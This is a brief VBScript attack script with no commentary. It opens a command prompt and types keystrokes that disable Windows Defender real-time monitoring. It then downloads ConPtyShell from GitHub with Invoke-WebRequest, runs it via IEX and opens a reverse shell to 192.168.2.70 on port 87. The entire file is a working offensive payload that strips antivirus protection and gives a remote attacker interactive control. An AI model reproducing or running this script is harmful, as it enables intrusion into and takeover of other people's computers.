Set oShell = WScript.CreateObject("Shell.Application")

oShell.ShellExecute "cmd.exe"

WScript.sleep(500)

Set WshShell = WScript.CreateObject("Wscript.Shell")

WshShell.SendKeys "PowerShell Set-MpPreference -DisableRealtimeMonitoring 1"
WshShell.SendKeys "{ENTER}"

WshShell.SendKeys "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.2.70 87"
WshShell.SendKeys "{ENTER}"
